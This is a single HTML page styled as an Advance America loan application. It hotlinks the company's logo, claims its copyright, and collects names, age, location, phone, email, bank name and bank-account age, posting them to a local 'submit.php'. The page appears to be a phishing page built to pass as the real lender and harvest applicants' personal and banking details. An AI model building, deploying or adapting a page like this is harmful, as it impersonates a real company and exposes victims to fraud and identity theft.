<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loan Application</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #ffffff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      color: #000;
    }

    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
    }

    .form-box {
      background: #fff;
      border: 2px solid #f9cc00;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      max-width: 220px;
      height: auto;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      font-size: 15px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      border: 1px solid #f9cc00;
      border-radius: 6px;
      margin-top: 6px;
      font-size: 15px;
      box-sizing: border-box;
    }

    button {
      background: #f9cc00;
      color: #000;
      padding: 14px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 25px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background: #f1be00;
    }

    footer {
      text-align: center;
      font-size: 13px;
      color: #666;
      padding: 20px 10px 40px;
    }

    @media (max-width: 600px) {
      .container {
        padding: 15px;
      }

      .form-box {
        padding: 20px;
      }

      label, input, select, button {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.advanceamerica.net/themes/custom/pf_aa_theme/pattern-library/assets/images/logos/AdvanceAmerica_Logo-full-Blue.svg" alt="Advance America">
    </div>
    <div class="form-box">
      <form action="submit.php" method="POST">
        <label>Loan Amount</label>
        <input type="text" name="amount" required>

        <label>First Name</label>
        <input type="text" name="firstname" required>

        <label>Last Name</label>
        <input type="text" name="lastname" required>

        <label>Age</label>
        <input type="number" name="age" required>

        <label>City</label>
        <input type="text" name="city" required>

        <label>ZIP</label>
        <input type="text" name="zip" required>

        <label>Phone Number</label>
        <input type="text" name="phone" required>

        <label>Email</label>
        <input type="email" name="email" required>

        <label>Bank Name</label>
        <input type="text" name="bank" required>

        <label>Age of Bank Account (Years)</label>
        <input type="number" name="years" required>

        <button type="submit">Submit Application</button>
      </form>
    </div>
  </div>

  <footer>
    &copy; 2025 Advance America. All rights reserved.
  </footer>
</body>
</html>
